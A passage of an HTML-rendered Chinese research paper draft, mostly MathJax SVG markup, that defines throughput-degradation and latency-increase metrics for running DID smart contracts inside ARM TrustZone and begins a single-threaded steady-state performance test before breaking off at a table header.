transform=\"translate(1403,0)\"/></g></g></g></g><g data-mml-node=\"msub\" transform=\"translate(1901.5,-686)\"><g data-mml-node=\"mi\"><path data-c=\"1D447\" d=\"M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z\"/></g><g data-mml-node=\"TeXAtom\" transform=\"translate(617,-150) scale(0.707)\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mtext\"><path data-c=\"52\" d=\"M130 622Q123 629 119 631T103 634T60 637H27V683H202H236H300Q376 683 417 677T500 648Q595 600 609 517Q610 512 610 501Q610 468 594 439T556 392T511 361T472 343L456 338Q459 335 467 332Q497 316 516 298T545 254T559 211T568 155T578 94Q588 46 602 31T640 16H645Q660 16 674 32T692 87Q692 98 696 101T712 105T728 103T732 90Q732 59 716 27T672 -16Q656 -22 630 -22Q481 -16 458 90Q456 101 456 163T449 246Q430 304 373 320L363 322L297 323H231V192L232 61Q238 51 249 49T301 46H334V0H323Q302 3 181 3Q59 3 38 0H27V46H60Q102 47 111 49T130 61V622ZM491 499V509Q491 527 490 539T481 570T462 601T424 623T362 636Q360 636 340 636T304 637H283Q238 637 234 628Q231 624 231 492V360H289Q390 360 434 378T489 456Q491 467 491 499Z\"/><path data-c=\"45\" d=\"M128 619Q121 626 117 628T101 631T58 634H25V680H597V676Q599 670 611 560T625 444V440H585V444Q584 447 582 465Q578 500 570 526T553 571T528 601T498 619T457 629T411 633T353 634Q266 634 251 633T233 622Q233 622 233 621Q232 619 232 497V376H286Q359 378 377 385Q413 401 416 469Q416 471 416 473V493H456V213H416V233Q415 268 408 288T383 317T349 328T297 330Q290 330 286 330H232V196V114Q232 57 237 52Q243 47 289 47H340H391Q428 47 452 50T505 62T552 92T584 146Q594 172 599 200T607 247T612 270V273H652V270Q651 267 632 137T610 3V0H25V46H58Q100 47 109 49T128 61V619Z\" transform=\"translate(736,0)\"/><path data-c=\"45\" d=\"M128 619Q121 626 117 628T101 631T58 634H25V680H597V676Q599 670 611 560T625 444V440H585V444Q584 447 582 465Q578 500 570 526T553 571T528 601T498 619T457 629T411 633T353 634Q266 634 251 633T233 622Q233 622 233 621Q232 619 232 497V376H286Q359 378 377 385Q413 401 416 469Q416 471 416 473V493H456V213H416V233Q415 268 408 288T383 317T349 328T297 330Q290 330 286 330H232V196V114Q232 57 237 52Q243 47 289 47H340H391Q428 47 452 50T505 62T552 92T584 146Q594 172 599 200T607 247T612 270V273H652V270Q651 267 632 137T610 3V0H25V46H58Q100 47 109 49T128 61V619Z\" transform=\"translate(1417,0)\"/></g></g></g><rect width=\"5713.6\" height=\"60\" x=\"120\" y=\"220\"/></g></g></g></svg></mjx-container></span></p>\n<p>其中 <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.375ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"4.865ex\" height=\"1.906ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -677 2150.5 842.6\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D447\" d=\"M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z\"/></g><g data-mml-node=\"TeXAtom\" transform=\"translate(617,-150) scale(0.707)\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mtext\"><path data-c=\"52\" d=\"M130 622Q123 629 119 631T103 634T60 637H27V683H202H236H300Q376 683 417 677T500 648Q595 600 609 517Q610 512 610 501Q610 468 594 439T556 392T511 361T472 343L456 338Q459 335 467 332Q497 316 516 298T545 254T559 211T568 155T578 94Q588 46 602 31T640 16H645Q660 16 674 32T692 87Q692 98 696 101T712 105T728 103T732 90Q732 59 716 27T672 -16Q656 -22 630 -22Q481 -16 458 90Q456 101 456 163T449 246Q430 304 373 320L363 322L297 323H231V192L232 61Q238 51 249 49T301 46H334V0H323Q302 3 181 3Q59 3 38 0H27V46H60Q102 47 111 49T130 61V622ZM491 499V509Q491 527 490 539T481 570T462 601T424 623T362 636Q360 636 340 636T304 637H283Q238 637 234 628Q231 624 231 492V360H289Q390 360 434 378T489 456Q491 467 491 499Z\"/><path data-c=\"45\" d=\"M128 619Q121 626 117 628T101 631T58 634H25V680H597V676Q599 670 611 560T625 444V440H585V444Q584 447 582 465Q578 500 570 526T553 571T528 601T498 619T457 629T411 633T353 634Q266 634 251 633T233 622Q233 622 233 621Q232 619 232 497V376H286Q359 378 377 385Q413 401 416 469Q416 471 416 473V493H456V213H416V233Q415 268 408 288T383 317T349 328T297 330Q290 330 286 330H232V196V114Q232 57 237 52Q243 47 289 47H340H391Q428 47 452 50T505 62T552 92T584 146Q594 172 599 200T607 247T612 270V273H652V270Q651 267 632 137T610 3V0H25V46H58Q100 47 109 49T128 61V619Z\" transform=\"translate(736,0)\"/><path data-c=\"45\" d=\"M128 619Q121 626 117 628T101 631T58 634H25V680H597V676Q599 670 611 560T625 444V440H585V444Q584 447 582 465Q578 500 570 526T553 571T528 601T498 619T457 629T411 633T353 634Q266 634 251 633T233 622Q233 622 233 621Q232 619 232 497V376H286Q359 378 377 385Q413 401 416 469Q416 471 416 473V493H456V213H416V233Q415 268 408 288T383 317T349 328T297 330Q290 330 286 330H232V196V114Q232 57 237 52Q243 47 289 47H340H391Q428 47 452 50T505 62T552 92T584 146Q594 172 599 200T607 247T612 270V273H652V270Q651 267 632 137T610 3V0H25V46H58Q100 47 109 49T128 61V619Z\" transform=\"translate(1417,0)\"/></g></g></g></g></g></svg></mjx-container></span>\n表示合约在普通世界（REE）中的吞吐率，<span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.339ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"4.843ex\" height=\"1.871ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -677 2140.6 827\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D447\" d=\"M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z\"/></g><g data-mml-node=\"TeXAtom\" transform=\"translate(617,-150) scale(0.707)\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mtext\"><path data-c=\"54\" d=\"M36 443Q37 448 46 558T55 671V677H666V671Q667 666 676 556T685 443V437H645V443Q645 445 642 478T631 544T610 593Q593 614 555 625Q534 630 478 630H451H443Q417 630 414 618Q413 616 413 339V63Q420 53 439 50T528 46H558V0H545L361 3Q186 1 177 0H164V46H194Q264 46 283 49T309 63V339V550Q309 620 304 625T271 630H244H224Q154 630 119 601Q101 585 93 554T81 486T76 443V437H36V443Z\"/><path data-c=\"45\" d=\"M128 619Q121 626 117 628T101 631T58 634H25V680H597V676Q599 670 611 560T625 444V440H585V444Q584 447 582 465Q578 500 570 526T553 571T528 601T498 619T457 629T411 633T353 634Q266 634 251 633T233 622Q233 622 233 621Q232 619 232 497V376H286Q359 378 377 385Q413 401 416 469Q416 471 416 473V493H456V213H416V233Q415 268 408 288T383 317T349 328T297 330Q290 330 286 330H232V196V114Q232 57 237 52Q243 47 289 47H340H391Q428 47 452 50T505 62T552 92T584 146Q594 172 599 200T607 247T612 270V273H652V270Q651 267 632 137T610 3V0H25V46H58Q100 47 109 49T128 61V619Z\" transform=\"translate(722,0)\"/><path data-c=\"45\" d=\"M128 619Q121 626 117 628T101 631T58 634H25V680H597V676Q599 670 611 560T625 444V440H585V444Q584 447 582 465Q578 500 570 526T553 571T528 601T498 619T457 629T411 633T353 634Q266 634 251 633T233 622Q233 622 233 621Q232 619 232 497V376H286Q359 378 377 385Q413 401 416 469Q416 471 416 473V493H456V213H416V233Q415 268 408 288T383 317T349 328T297 330Q290 330 286 330H232V196V114Q232 57 237 52Q243 47 289 47H340H391Q428 47 452 50T505 62T552 92T584 146Q594 172 599 200T607 247T612 270V273H652V270Q651 267 632 137T610 3V0H25V46H58Q100 47 109 49T128 61V619Z\" transform=\"translate(1403,0)\"/></g></g></g></g></g></svg></mjx-container></span> 表示迁移至 TrustZone\n后的吞吐率。TDR 反映因启用 TEE 而引入的性能损耗比例。</p>\n<ul>\n<li><strong>延迟提高率（Latency Increase Rate, LIR）</strong>：</li>\n</ul>\n<p><span class=\"math display\"><mjx-container class=\"MathJax\" jax=\"SVG\" display=\"true\"><svg style=\"vertical-align: -1.927ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"20.822ex\" height=\"5.001ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -1359 9203.1 2210.6\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mtext\"><path data-c=\"4C\" d=\"M128 622Q121 629 117 631T101 634T58 637H25V683H36Q48 680 182 680Q324 680 348 683H360V637H333Q273 637 258 635T233 622L232 342V129Q232 57 237 52Q243 47 313 47Q384 47 410 53Q470 70 498 110T536 221Q536 226 537 238T540 261T542 272T562 273H582V268Q580 265 568 137T554 5V0H25V46H58Q100 47 109 49T128 61V622Z\"/><path data-c=\"49\" d=\"M328 0Q307 3 180 3T32 0H21V46H43Q92 46 106 49T126 60Q128 63 128 342Q128 620 126 623Q122 628 118 630T96 635T43 637H21V683H32Q53 680 180 680T328 683H339V637H317Q268 637 254 634T234 623Q232 620 232 342Q232 63 234 60Q238 55 242 53T264 48T317 46H339V0H328Z\" transform=\"translate(625,0)\"/><path data-c=\"52\" d=\"M130 622Q123 629 119 631T103 634T60 637H27V683H202H236H300Q376 683 417 677T500 648Q595 600 609 517Q610 512 610 501Q610 468 594 439T556 392T511 361T472 343L456 338Q459 335 467 332Q497 316 516 298T545 254T559 211T568 155T578 94Q588 46 602 31T640 16H645Q660 16 674 32T692 87Q692 98 696 101T712 105T728 103T732 90Q732 59 716 27T672 -16Q656 -22 630 -22Q481 -16 458 90Q456 101 456 163T449 246Q430 304 373 320L363 322L297 323H231V192L232 61Q238 51 249 49T301 46H334V0H323Q302 3 181 3Q59 3 38 0H27V46H60Q102 47 111 49T130 61V622ZM491 499V509Q491 527 490 539T481 570T462 601T424 623T362 636Q360 636 340 636T304 637H283Q238 637 234 628Q231 624 231 492V360H289Q390 360 434 378T489 456Q491 467 491 499Z\" transform=\"translate(986,0)\"/></g><g data-mml-node=\"mo\" transform=\"translate(1999.8,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mfrac\" transform=\"translate(3055.6,0)\"><g data-mml-node=\"mrow\" transform=\"translate(220,676)\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D43F\" d=\"M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z\"/></g><g data-mml-node=\"TeXAtom\" transform=\"translate(714,-150) scale(0.707)\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mtext\"><path data-c=\"54\" d=\"M36 443Q37 448 46 558T55 671V677H666V671Q667 666 676 556T685 443V437H645V443Q645 445 642 478T631 544T610 593Q593 614 555 625Q534 630 478 630H451H443Q417 630 414 618Q413 616 413 339V63Q420 53 439 50T528 46H558V0H545L361 3Q186 1 177 0H164V46H194Q264 46 283 49T309 63V339V550Q309 620 304 625T271 630H244H224Q154 630 119 601Q101 585 93 554T81 486T76 443V437H36V443Z\"/><path data-c=\"45\" d=\"M128 619Q121 626 117 628T101 631T58 634H25V680H597V676Q599 670 611 560T625 444V440H585V444Q584 447 582 465Q578 500 570 526T553 571T528 601T498 619T457 629T411 633T353 634Q266 634 251 633T233 622Q233 622 233 621Q232 619 232 497V376H286Q359 378 377 385Q413 401 416 469Q416 471 416 473V493H456V213H416V233Q415 268 408 288T383 317T349 328T297 330Q290 330 286 330H232V196V114Q232 57 237 52Q243 47 289 47H340H391Q428 47 452 50T505 62T552 92T584 146Q594 172 599 200T607 247T612 270V273H652V270Q651 267 632 137T610 3V0H25V46H58Q100 47 109 49T128 61V619Z\" transform=\"translate(722,0)\"/><path data-c=\"45\" d=\"M128 619Q121 626 117 628T101 631T58 634H25V680H597V676Q599 670 611 560T625 444V440H585V444Q584 447 582 465Q578 500 570 526T553 571T528 601T498 619T457 629T411 633T353 634Q266 634 251 633T233 622Q233 622 233 621Q232 619 232 497V376H286Q359 378 377 385Q413 401 416 469Q416 471 416 473V493H456V213H416V233Q415 268 408 288T383 317T349 328T297 330Q290 330 286 330H232V196V114Q232 57 237 52Q243 47 289 47H340H391Q428 47 452 50T505 62T552 92T584 146Q594 172 599 200T607 247T612 270V273H652V270Q651 267 632 137T610 3V0H25V46H58Q100 47 109 49T128 61V619Z\" transform=\"translate(1403,0)\"/></g></g></g><g data-mml-node=\"mo\" transform=\"translate(2459.8,0)\"><path data-c=\"2212\" d=\"M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(3460.1,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D43F\" d=\"M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z\"/></g><g data-mml-node=\"TeXAtom\" transform=\"translate(714,-150) scale(0.707)\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mtext\"><path data-c=\"52\" d=\"M130 622Q123 629 119 631T103 634T60 637H27V683H202H236H300Q376 683 417 677T500 648Q595 600 609 517Q610 512 610 501Q610 468 594 439T556 392T511 361T472 343L456 338Q459 335 467 332Q497 316 516 298T545 254T559 211T568 155T578 94Q588 46 602 31T640 16H645Q660 16 674 32T692 87Q692 98 696 101T712 105T728 103T732 90Q732 59 716 27T672 -16Q656 -22 630 -22Q481 -16 458 90Q456 101 456 163T449 246Q430 304 373 320L363 322L297 323H231V192L232 61Q238 51 249 49T301 46H334V0H323Q302 3 181 3Q59 3 38 0H27V46H60Q102 47 111 49T130 61V622ZM491 499V509Q491 527 490 539T481 570T462 601T424 623T362 636Q360 636 340 636T304 637H283Q238 637 234 628Q231 624 231 492V360H289Q390 360 434 378T489 456Q491 467 491 499Z\"/><path data-c=\"45\" d=\"M128 619Q121 626 117 628T101 631T58 634H25V680H597V676Q599 670 611 560T625 444V440H585V444Q584 447 582 465Q578 500 570 526T553 571T528 601T498 619T457 629T411 633T353 634Q266 634 251 633T233 622Q233 622 233 621Q232 619 232 497V376H286Q359 378 377 385Q413 401 416 469Q416 471 416 473V493H456V213H416V233Q415 268 408 288T383 317T349 328T297 330Q290 330 286 330H232V196V114Q232 57 237 52Q243 47 289 47H340H391Q428 47 452 50T505 62T552 92T584 146Q594 172 599 200T607 247T612 270V273H652V270Q651 267 632 137T610 3V0H25V46H58Q100 47 109 49T128 61V619Z\" transform=\"translate(736,0)\"/><path data-c=\"45\" d=\"M128 619Q121 626 117 628T101 631T58 634H25V680H597V676Q599 670 611 560T625 444V440H585V444Q584 447 582 465Q578 500 570 526T553 571T528 601T498 619T457 629T411 633T353 634Q266 634 251 633T233 622Q233 622 233 621Q232 619 232 497V376H286Q359 378 377 385Q413 401 416 469Q416 471 416 473V493H456V213H416V233Q415 268 408 288T383 317T349 328T297 330Q290 330 286 330H232V196V114Q232 57 237 52Q243 47 289 47H340H391Q428 47 452 50T505 62T552 92T584 146Q594 172 599 200T607 247T612 270V273H652V270Q651 267 632 137T610 3V0H25V46H58Q100 47 109 49T128 61V619Z\" transform=\"translate(1417,0)\"/></g></g></g></g><g data-mml-node=\"msub\" transform=\"translate(1950,-686)\"><g data-mml-node=\"mi\"><path data-c=\"1D43F\" d=\"M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z\"/></g><g data-mml-node=\"TeXAtom\" transform=\"translate(714,-150) scale(0.707)\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mtext\"><path data-c=\"52\" d=\"M130 622Q123 629 119 631T103 634T60 637H27V683H202H236H300Q376 683 417 677T500 648Q595 600 609 517Q610 512 610 501Q610 468 594 439T556 392T511 361T472 343L456 338Q459 335 467 332Q497 316 516 298T545 254T559 211T568 155T578 94Q588 46 602 31T640 16H645Q660 16 674 32T692 87Q692 98 696 101T712 105T728 103T732 90Q732 59 716 27T672 -16Q656 -22 630 -22Q481 -16 458 90Q456 101 456 163T449 246Q430 304 373 320L363 322L297 323H231V192L232 61Q238 51 249 49T301 46H334V0H323Q302 3 181 3Q59 3 38 0H27V46H60Q102 47 111 49T130 61V622ZM491 499V509Q491 527 490 539T481 570T462 601T424 623T362 636Q360 636 340 636T304 637H283Q238 637 234 628Q231 624 231 492V360H289Q390 360 434 378T489 456Q491 467 491 499Z\"/><path data-c=\"45\" d=\"M128 619Q121 626 117 628T101 631T58 634H25V680H597V676Q599 670 611 560T625 444V440H585V444Q584 447 582 465Q578 500 570 526T553 571T528 601T498 619T457 629T411 633T353 634Q266 634 251 633T233 622Q233 622 233 621Q232 619 232 497V376H286Q359 378 377 385Q413 401 416 469Q416 471 416 473V493H456V213H416V233Q415 268 408 288T383 317T349 328T297 330Q290 330 286 330H232V196V114Q232 57 237 52Q243 47 289 47H340H391Q428 47 452 50T505 62T552 92T584 146Q594 172 599 200T607 247T612 270V273H652V270Q651 267 632 137T610 3V0H25V46H58Q100 47 109 49T128 61V619Z\" transform=\"translate(736,0)\"/><path data-c=\"45\" d=\"M128 619Q121 626 117 628T101 631T58 634H25V680H597V676Q599 670 611 560T625 444V440H585V444Q584 447 582 465Q578 500 570 526T553 571T528 601T498 619T457 629T411 633T353 634Q266 634 251 633T233 622Q233 622 233 621Q232 619 232 497V376H286Q359 378 377 385Q413 401 416 469Q416 471 416 473V493H456V213H416V233Q415 268 408 288T383 317T349 328T297 330Q290 330 286 330H232V196V114Q232 57 237 52Q243 47 289 47H340H391Q428 47 452 50T505 62T552 92T584 146Q594 172 599 200T607 247T612 270V273H652V270Q651 267 632 137T610 3V0H25V46H58Q100 47 109 49T128 61V619Z\" transform=\"translate(1417,0)\"/></g></g></g><rect width=\"5907.6\" height=\"60\" x=\"120\" y=\"220\"/></g></g></g></svg></mjx-container></span></p>\n<p>其中 <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.375ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"5.085ex\" height=\"1.92ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -683 2247.5 848.6\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D43F\" d=\"M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z\"/></g><g data-mml-node=\"TeXAtom\" transform=\"translate(714,-150) scale(0.707)\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mtext\"><path data-c=\"52\" d=\"M130 622Q123 629 119 631T103 634T60 637H27V683H202H236H300Q376 683 417 677T500 648Q595 600 609 517Q610 512 610 501Q610 468 594 439T556 392T511 361T472 343L456 338Q459 335 467 332Q497 316 516 298T545 254T559 211T568 155T578 94Q588 46 602 31T640 16H645Q660 16 674 32T692 87Q692 98 696 101T712 105T728 103T732 90Q732 59 716 27T672 -16Q656 -22 630 -22Q481 -16 458 90Q456 101 456 163T449 246Q430 304 373 320L363 322L297 323H231V192L232 61Q238 51 249 49T301 46H334V0H323Q302 3 181 3Q59 3 38 0H27V46H60Q102 47 111 49T130 61V622ZM491 499V509Q491 527 490 539T481 570T462 601T424 623T362 636Q360 636 340 636T304 637H283Q238 637 234 628Q231 624 231 492V360H289Q390 360 434 378T489 456Q491 467 491 499Z\"/><path data-c=\"45\" d=\"M128 619Q121 626 117 628T101 631T58 634H25V680H597V676Q599 670 611 560T625 444V440H585V444Q584 447 582 465Q578 500 570 526T553 571T528 601T498 619T457 629T411 633T353 634Q266 634 251 633T233 622Q233 622 233 621Q232 619 232 497V376H286Q359 378 377 385Q413 401 416 469Q416 471 416 473V493H456V213H416V233Q415 268 408 288T383 317T349 328T297 330Q290 330 286 330H232V196V114Q232 57 237 52Q243 47 289 47H340H391Q428 47 452 50T505 62T552 92T584 146Q594 172 599 200T607 247T612 270V273H652V270Q651 267 632 137T610 3V0H25V46H58Q100 47 109 49T128 61V619Z\" transform=\"translate(736,0)\"/><path data-c=\"45\" d=\"M128 619Q121 626 117 628T101 631T58 634H25V680H597V676Q599 670 611 560T625 444V440H585V444Q584 447 582 465Q578 500 570 526T553 571T528 601T498 619T457 629T411 633T353 634Q266 634 251 633T233 622Q233 622 233 621Q232 619 232 497V376H286Q359 378 377 385Q413 401 416 469Q416 471 416 473V493H456V213H416V233Q415 268 408 288T383 317T349 328T297 330Q290 330 286 330H232V196V114Q232 57 237 52Q243 47 289 47H340H391Q428 47 452 50T505 62T552 92T584 146Q594 172 599 200T607 247T612 270V273H652V270Q651 267 632 137T610 3V0H25V46H58Q100 47 109 49T128 61V619Z\" transform=\"translate(1417,0)\"/></g></g></g></g></g></svg></mjx-container></span> 与 <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.339ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"5.062ex\" height=\"1.885ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -683 2237.6 833\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D43F\" d=\"M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z\"/></g><g data-mml-node=\"TeXAtom\" transform=\"translate(714,-150) scale(0.707)\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mtext\"><path data-c=\"54\" d=\"M36 443Q37 448 46 558T55 671V677H666V671Q667 666 676 556T685 443V437H645V443Q645 445 642 478T631 544T610 593Q593 614 555 625Q534 630 478 630H451H443Q417 630 414 618Q413 616 413 339V63Q420 53 439 50T528 46H558V0H545L361 3Q186 1 177 0H164V46H194Q264 46 283 49T309 63V339V550Q309 620 304 625T271 630H244H224Q154 630 119 601Q101 585 93 554T81 486T76 443V437H36V443Z\"/><path data-c=\"45\" d=\"M128 619Q121 626 117 628T101 631T58 634H25V680H597V676Q599 670 611 560T625 444V440H585V444Q584 447 582 465Q578 500 570 526T553 571T528 601T498 619T457 629T411 633T353 634Q266 634 251 633T233 622Q233 622 233 621Q232 619 232 497V376H286Q359 378 377 385Q413 401 416 469Q416 471 416 473V493H456V213H416V233Q415 268 408 288T383 317T349 328T297 330Q290 330 286 330H232V196V114Q232 57 237 52Q243 47 289 47H340H391Q428 47 452 50T505 62T552 92T584 146Q594 172 599 200T607 247T612 270V273H652V270Q651 267 632 137T610 3V0H25V46H58Q100 47 109 49T128 61V619Z\" transform=\"translate(722,0)\"/><path data-c=\"45\" d=\"M128 619Q121 626 117 628T101 631T58 634H25V680H597V676Q599 670 611 560T625 444V440H585V444Q584 447 582 465Q578 500 570 526T553 571T528 601T498 619T457 629T411 633T353 634Q266 634 251 633T233 622Q233 622 233 621Q232 619 232 497V376H286Q359 378 377 385Q413 401 416 469Q416 471 416 473V493H456V213H416V233Q415 268 408 288T383 317T349 328T297 330Q290 330 286 330H232V196V114Q232 57 237 52Q243 47 289 47H340H391Q428 47 452 50T505 62T552 92T584 146Q594 172 599 200T607 247T612 270V273H652V270Q651 267 632 137T610 3V0H25V46H58Q100 47 109 49T128 61V619Z\" transform=\"translate(1403,0)\"/></g></g></g></g></g></svg></mjx-container></span> 分别表示操作在 REE 与 TEE\n中执行的平均延迟，LIR 表征延迟因可信执行而增长的相对幅度。</p>\n<p>表 1 展示了本系统与 TZ4Fabric 在典型操作下的性能下降率对比：</p>\n<p>注：TZ4Fabric 的数据来自其原始论文第X节实验结果（如使用，请加引用\n[X]）。</p>\n<h2 id=\"did-稳态性能评估\">6.3 DID 稳态性能评估</h2>\n<p>为评估本系统中 DID 合约的核心功能在典型使用情境下的执行效率，我们对\n<strong>DID 注册（Create DID）</strong>、<strong>DID 文档查询（Query\nDID）</strong> 和 <strong>VC 验证（Verify VC）</strong>\n三个功能进行了稳态性能测试。每项操作在单线程下连续执行 200\n次，并记录平均响应时间，以反映在资源受限环境中，系统对单个用户请求的服务能力。</p>\n<h4 id=\"测试指标\">测试指标</h4>\n<p>表 1 列出了三项功能在稳态下的平均响应时间：</p>\n<hr>\n<h4 id=\"表-1did-合约功能稳态性能指标单线程-200-次\">表 1：DID\n合约功能稳态性能指标（单线程 × 200 次）</h4>\n<table>\n<colgroup>\n<col style=\"width: 12%\">\n<col style=\"width: 23%\">\n<col style=\"width: 15%\">\n<col style=\"width: 15%\">\n<col style=\"width: 